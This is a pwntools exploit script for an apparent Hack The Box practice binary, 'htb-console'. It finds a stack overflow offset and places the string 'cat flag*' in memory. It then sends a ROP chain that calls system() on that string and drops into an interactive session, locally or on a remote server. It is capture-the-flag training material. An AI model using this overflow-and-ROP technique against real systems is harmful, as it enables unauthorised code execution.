from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>>', 'flag')
    p.sendlineafter('Enter flag:', payload)

    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of the crash
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b* 0x401280
b* 0x40129d
continue
'''.format(**locals())


# Binary filename
exe = './htb-console'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset (to be used to overflow buffer at flag option):
#offset = 24
offset = find_ip(cyclic(100))

# Start program
io = start()

binsh_addr = 0x4040b0

# We want to inject /bin/sh string using HoF option
io.sendlineafter('>>', 'hof')
io.sendlineafter('Enter your name:', 'cat flag*')

rop = ROP(elf)
rop.system(binsh_addr)

# payload = flat(
#     {('\x00'*offset): rop.chain()}
# )
payload = b"".join([
        b'\x00'*offset,
        rop.chain()
        ])

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter('>>', 'flag')
io.sendlineafter('Enter flag:', payload)

# Get flag/shell
# flag = io.recv()
io.interactive()

